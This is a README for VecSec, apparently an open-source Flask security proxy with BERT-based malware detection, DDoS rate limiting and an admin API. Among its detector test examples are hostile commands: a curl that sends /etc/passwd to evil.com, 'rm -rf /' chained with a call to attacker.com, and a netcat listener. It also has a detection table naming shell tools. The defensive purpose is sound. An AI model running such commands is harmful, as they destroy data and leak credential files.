# 🛡️ VecSec - Advanced Security Proxy

<div align="center">

![VecSec Logo](https://img.shields.io/badge/VecSec-Security%20Proxy-blue?style=for-the-badge&logo=shield&logoColor=white)

**Enterprise-Grade HTTP Proxy with AI-Powered Threat Detection & DDoS Protection**

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat&logo=python&logoColor=white)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-2.3%2B-green?style=flat&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
[![Docker](https://img.shields.io/badge/Docker-Ready-blue?style=flat&logo=docker&logoColor=white)](https://docker.com)
[![License](https://img.shields.io/badge/License-MIT-green?style=flat)](LICENSE)

</div>

## 🚀 What is VecSec?

VecSec is a next-generation HTTP proxy server that combines **AI-powered malware detection**, **comprehensive DDoS protection**, and **advanced security controls** to protect your infrastructure from modern cyber threats.

### 🎯 Key Capabilities

- **🤖 AI-Powered Malware Detection** - Real-time analysis using Malware-BERT transformer model
- **🛡️ DDoS Protection** - Production-ready rate limiting and attack prevention
- **🔍 Pattern-Based Detection** - Detects shell commands, encoded payloads, suspicious URLs, and script injection
- **⚡ High Performance** - Built with Flask and optimized for enterprise workloads
- **🐳 Docker Ready** - Easy deployment with Docker Compose
- **📊 Real-Time Monitoring** - Comprehensive admin API and statistics

## 🔥 Core Features

### 🤖 AI-Powered Malware Detection
- **Malware-BERT Model**: Advanced transformer-based threat detection
- **Real-Time Analysis**: Instant scanning of requests and responses
- **Pattern Recognition**: Detects shell commands, encoded payloads, and script injection
- **Threat Classification**: Clean, Suspicious, or Malicious categorization
- **Automatic Blocking**: Prevents malicious content from reaching your systems

### 🛡️ Enterprise DDoS Protection
- **Multi-Layer Defense**: Rate limiting, connection management, and request validation
- **Redis Integration**: Distributed protection across multiple instances
- **IP Management**: Allowlist, blocklist, and automatic violation tracking
- **Admin Dashboard**: Real-time monitoring and management capabilities
- **Configurable Limits**: Customizable per-IP and per-endpoint restrictions

### ⚡ High-Performance Proxy
- **Universal HTTP Support**: All HTTP methods and protocols
- **Header Preservation**: Maintains request/response integrity
- **URL Validation**: Security controls and host filtering
- **Error Handling**: Comprehensive error responses and logging
- **Health Monitoring**: Built-in health checks and status endpoints

### 📊 Monitoring & Administration
- **Real-Time Stats**: Live protection metrics and system health
- **RESTful API**: Complete programmatic control
- **Detailed Logging**: Comprehensive attack and system logging
- **Configuration Management**: Runtime configuration updates

## 🎯 Threat Detection Capabilities

### 🔍 Malware-BERT AI Detection

VecSec uses advanced AI to detect and block malicious content in real-time:

| Threat Type | Examples | Detection Method |
|-------------|----------|------------------|
| **Shell Commands** | `rm -rf /`, `curl`, `wget`, `nc`, `bash`, `powershell` | Pattern + ML |
| **Encoded Payloads** | Base64, hex, URL-encoded data | Pattern Analysis |
| **Suspicious URLs** | URL shorteners, suspicious TLDs, IP addresses | Pattern Matching |
| **Script Injection** | `<script>` tags, `javascript:`, `eval()` functions | Pattern + ML |
| **Network C2** | Beaconing, data exfiltration commands | Pattern Analysis |
| **File Operations** | Destructive commands, persistence mechanisms | Pattern Matching |

### 🚨 Threat Classification

| Level | Description | Action |
|-------|-------------|--------|
| **🟢 Clean** | Benign text/code | Allow |
| **🟡 Suspicious** | Partial indicators (encoded strings, suspicious imports) | Log + Monitor |
| **🔴 Malicious** | Clearly malicious payloads | Block Immediately |

### 🧠 Detection Methods

1. **Pattern-Based Detection**: Regex patterns for known attack vectors
2. **ML-Based Detection**: BERT transformer model trained on malware samples  
3. **Combined Analysis**: Both methods working together for maximum accuracy

## 🛡️ DDoS Protection Features

VecSec provides enterprise-grade DDoS protection with multiple layers of defense:

### ⚡ Rate Limiting
- **Per-IP Limits**: Configurable requests per minute/hour/day
- **Per-Endpoint Limits**: Custom limits for specific endpoints  
- **Sliding Window**: Token bucket algorithm for fair rate limiting
- **Redis Support**: Distributed rate limiting across multiple instances

### 🔗 Connection Management
- **Concurrent Limits**: Maximum connections per IP
- **Connection Tracking**: Real-time connection monitoring
- **Slowloris Protection**: Detection of slow request attacks
- **Timeout Management**: Configurable request timeouts

### ✅ Request Validation
- **Size Limits**: Maximum request and header sizes
- **Content Validation**: Malware scanning of request/response content
- **Header Sanitization**: Removal of hop-by-hop headers
- **URL Validation**: Only HTTP/HTTPS URLs allowed

### 🌐 IP Management
- **Allowlist/Blocklist**: Permanent IP management
- **Automatic Blocking**: Temporary blocking after violations
- **Violation Tracking**: Count and track rate limit violations
- **Admin API**: Programmatic IP management

### 📊 Monitoring & Administration
- **Real-Time Stats**: Live monitoring of protection metrics
- **Admin Endpoints**: RESTful API for management
- **Detailed Logging**: Comprehensive attack logging
- **Health Checks**: System health monitoring

## 🚀 Quick Start

### Option 1: Docker Compose (Recommended for Production)

```bash
# Clone the repository
git clone https://github.com/your-org/vecsec.git
cd vecsec

# Start all services
docker-compose up -d

# Verify installation
curl http://localhost:8080/health
```

**Access Points:**
- 🛡️ **VecSec Proxy**: `http://localhost:8080`
- 📊 **Redis Commander**: `http://localhost:8081` (optional)
- 🔧 **Admin API**: `http://localhost:8080/admin/ddos/stats`

### Option 2: Development Setup

```bash
# Install uv (if not already installed)
curl -LsSf https://astral.sh/uv/install.sh | sh

# Clone and setup
git clone https://github.com/your-org/vecsec.git
cd vecsec
uv sync

# Start the server
uv run python app.py
```

### Option 3: Traditional pip Installation

```bash
# Clone repository
git clone https://github.com/your-org/vecsec.git
cd vecsec

# Install dependencies
pip install -r requirements.txt

# Start the server
python app.py
```

## 📖 Usage Guide

### 🔧 Basic Proxy Usage

VecSec acts as a secure HTTP proxy, forwarding requests while providing protection:

```bash
# Basic GET request
curl "http://localhost:8080/?target=https://api.github.com/users/octocat"

# POST request with JSON data
curl -X POST "http://localhost:8080/?target=https://httpbin.org/post" \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello World"}'

# Request with path and query parameters
curl "http://localhost:8080/users/123?target=https://jsonplaceholder.typicode.com&include=posts"
```

### 🛡️ Security Features in Action

**Malicious Request Blocking:**
```bash
# This request will be blocked due to malicious content
curl "http://localhost:8080/?target=https://httpbin.org/get&malicious=rm%20-rf%20/"

# Response:
# {
#   "error": "Response blocked due to malicious content",
#   "malware_analysis": {
#     "threat_level": "malicious",
#     "confidence": 0.9,
#     "indicators": ["Suspicious shell commands detected"]
#   }
# }
```

**Rate Limiting:**
```bash
# After exceeding rate limits, requests will be throttled
for i in {1..10}; do curl http://localhost:8080/health; done
```

## 🔌 API Reference

### 🏥 Health & Status

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/health` | GET | Server health status |
| `/config` | GET | Current configuration |

```bash
# Check server health
curl http://localhost:8080/health

# View configuration
curl http://localhost:8080/config
```

### 🤖 Malware Detection API

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/analyze` | POST | Analyze text content for malware |
| `/scan` | POST | Scan uploaded files for malware |
| `/patterns` | GET | View available detection patterns |

**Analyze Text Content:**
```bash
curl -X POST "http://localhost:8080/analyze" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "curl https://evil.com --data \"$(cat /etc/passwd)\"",
    "use_ml": true
  }'
```

**Scan File:**
```bash
curl -X POST "http://localhost:8080/scan" \
  -F "file=@suspicious_script.sh"
```

**Get Detection Patterns:**
```bash
curl "http://localhost:8080/patterns"
```

### 🛡️ DDoS Protection Admin API

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/admin/ddos/stats` | GET | Protection statistics |
| `/admin/ddos/ips` | GET | IP statistics and violations |
| `/admin/ddos/block/<ip>` | POST | Block an IP address |
| `/admin/ddos/unblock/<ip>` | POST | Unblock an IP address |
| `/admin/ddos/allowlist/<ip>` | POST | Add IP to allowlist |
| `/admin/ddos/blocklist/<ip>` | POST | Add IP to blocklist |
| `/admin/ddos/config` | GET/POST | View/update configuration |

**View Protection Statistics:**
```bash
curl "http://localhost:8080/admin/ddos/stats"
```

**Block an IP Address:**
```bash
curl -X POST "http://localhost:8080/admin/ddos/block/192.168.1.100" \
  -H "Content-Type: application/json" \
  -d '{"duration": 300}'
```

**Add IP to Allowlist:**
```bash
curl -X POST "http://localhost:8080/admin/ddos/allowlist/192.168.1.50"
```

**View Current Configuration:**
```bash
curl "http://localhost:8080/admin/ddos/config"
```

## Configuration

### Environment Variables

The application can be configured using environment variables. See `ddos_config_examples.env` for comprehensive examples.

**Basic Configuration:**
- `DEFAULT_TARGET_URL`: Default target when no target is specified
- `ALLOWED_HOSTS`: Comma-separated list of allowed hostnames
- `BLOCKED_PATHS`: Comma-separated list of paths to block

**DDoS Protection Configuration:**
- `DDOS_REQUESTS_PER_MINUTE`: Requests per minute per IP (default: 60)
- `DDOS_REQUESTS_PER_HOUR`: Requests per hour per IP (default: 1000)
- `DDOS_REQUESTS_PER_DAY`: Requests per day per IP (default: 10000)
- `DDOS_MAX_CONNECTIONS`: Max concurrent connections per IP (default: 10)
- `DDOS_MAX_REQUEST_SIZE`: Max request size in bytes (default: 10MB)
- `DDOS_MAX_HEADER_SIZE`: Max header size in bytes (default: 8KB)
- `DDOS_BLOCK_DURATION`: Block duration in seconds (default: 300)
- `DDOS_MAX_VIOLATIONS`: Violations before auto-block (default: 5)

**Redis Configuration:**
- `DDOS_REDIS_ENABLED`: Enable Redis for distributed limiting (default: false)
- `DDOS_REDIS_URL`: Redis connection URL (default: redis://localhost:6379/0)

**IP Management:**
- `DDOS_ALLOWLIST`: Comma-separated list of allowed IPs
- `DDOS_BLOCKLIST`: Comma-separated list of blocked IPs

## Security Features

1. **URL Validation**: Only allows HTTP/HTTPS URLs
2. **Host Filtering**: Optional host allowlisting
3. **Path Blocking**: Block specific paths
4. **Header Sanitization**: Removes hop-by-hop headers
5. **Timeout Protection**: 30-second request timeout

## Examples

### Test with httpbin.org
```bash
# Test GET request
curl "http://localhost:8080/?target=https://httpbin.org/get"

# Test POST request
curl -X POST "http://localhost:8080/?target=https://httpbin.org/post" \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello World"}'

# Test with query parameters
curl "http://localhost:8080/?target=https://httpbin.org/get&param1=value1&param2=value2"
```

### Test with different APIs
```bash
# GitHub API
curl "http://localhost:8080/?target=https://api.github.com/repos/microsoft/vscode"

# JSONPlaceholder API
curl "http://localhost:8080/posts/1?target=https://jsonplaceholder.typicode.com"
```

## Error Handling

The proxy returns appropriate HTTP status codes:

- `400 Bad Request`: Unsafe or invalid URL
- `403 Forbidden`: Blocked path
- `502 Bad Gateway`: Connection failed
- `504 Gateway Timeout`: Request timeout
- `500 Internal Server Error`: Other errors

## Testing

### DDoS Protection Testing

Run the comprehensive test suite:

```bash
python test_ddos_protection.py
```

Test with custom server URL:
```bash
python test_ddos_protection.py --server-url http://localhost:8080
```

Generate detailed report:
```bash
python test_ddos_protection.py --report
```

### Manual Testing

Test rate limiting:
```bash
# This should trigger rate limiting after 5 requests
for i in {1..10}; do curl http://localhost:8080/health; done
```

Test connection limits:
```bash
# Run multiple concurrent requests
for i in {1..20}; do curl http://localhost:8080/health & done
```

Test IP blocking:
```bash
# Block an IP
curl -X POST "http://localhost:8080/admin/ddos/block/192.168.1.100"

# Try to access from blocked IP (if you can simulate it)
curl http://localhost:8080/health
```

## Development

To run in development mode with auto-reload:

**Using uv:**
```bash
uv run python app.py
```

**Using pip:**
```bash
export FLASK_ENV=development
python app.py
```

## Training Malware-BERT

To train the Malware-BERT model with your own data:

```bash
# Train the model
uv run python train_malware_bert.py

# The script will:
# 1. Generate synthetic training data
# 2. Train the BERT model
# 3. Evaluate performance
# 4. Save the trained model as malware_bert_model.pth
```

### Custom Training Data

Edit `train_malware_bert.py` to add your own training examples:

```python
# Add your own examples to the generate_training_data() function
clean_examples = [
    "Your clean examples here...",
]

suspicious_examples = [
    "Your suspicious examples here...",
]

malicious_examples = [
    "Your malicious examples here...",
]
```

## Production Deployment

For production, consider using a WSGI server like Gunicorn:

**Using uv:**
```bash
uv add gunicorn
uv run gunicorn -w 4 -b 0.0.0.0:8080 app:app
```

**Using pip:**
```bash
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:8080 app:app
```

## 🎯 Use Cases

### 🏢 Enterprise Applications

**API Gateway Security**
- Protect internal APIs from malicious requests
- Rate limit external clients
- Scan all incoming/outgoing data for threats

**Microservices Protection**
- Secure inter-service communication
- Monitor data exfiltration attempts
- Block suspicious service calls

**Web Application Firewall**
- Replace traditional WAFs with AI-powered detection
- Real-time threat analysis
- Automatic blocking of malicious content

### 🔒 Security Scenarios

**Data Exfiltration Prevention**
```bash
# Block attempts to exfiltrate data
curl "http://localhost:8080/?target=https://api.example.com/users" \
  -H "Authorization: Bearer token" \
  -d '{"query": "SELECT * FROM users WHERE password LIKE \"%admin%\""}'
```

**Command Injection Protection**
```bash
# Block command injection attempts
curl -X POST "http://localhost:8080/?target=https://api.example.com/exec" \
  -d '{"command": "rm -rf / && curl http://attacker.com/steal"}'
```

**DDoS Mitigation**
```bash
# Automatic rate limiting and IP blocking
for i in {1..1000}; do
  curl http://localhost:8080/health &
done
```

## 🚀 Getting Started Examples

### Example 1: Basic Proxy Setup

```bash
# Start VecSec
docker-compose up -d

# Test basic proxy functionality
curl "http://localhost:8080/?target=https://httpbin.org/get"

# Check security status
curl "http://localhost:8080/health"
```

### Example 2: Malware Detection

```bash
# Test malware detection
curl -X POST "http://localhost:8080/analyze" \
  -H "Content-Type: application/json" \
  -d '{
    "content": "rm -rf / && while true; do nc -l 4444; done",
    "use_ml": false
  }'
```

### Example 3: DDoS Protection

```bash
# View protection statistics
curl "http://localhost:8080/admin/ddos/stats"

# Block a suspicious IP
curl -X POST "http://localhost:8080/admin/ddos/block/192.168.1.100" \
  -H "Content-Type: application/json" \
  -d '{"duration": 3600}'
```

## 🤝 Contributing

We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.

### Development Setup

```bash
# Fork and clone the repository
git clone https://github.com/your-username/vecsec.git
cd vecsec

# Install development dependencies
uv sync --dev

# Run tests
uv run pytest

# Start development server
uv run python app.py
```

## 📄 License

This project is open source and available under the [MIT License](LICENSE).

## 🙏 Acknowledgments

- [Flask](https://flask.palletsprojects.com/) - Web framework
- [Transformers](https://huggingface.co/transformers/) - AI/ML models
- [Redis](https://redis.io/) - Distributed caching
- [Docker](https://docker.com/) - Containerization

---

<div align="center">

**🛡️ VecSec - Protecting Your Infrastructure with AI-Powered Security**

[Documentation](https://github.com/your-org/vecsec/wiki) • [Issues](https://github.com/your-org/vecsec/issues) • [Discussions](https://github.com/your-org/vecsec/discussions)

</div>
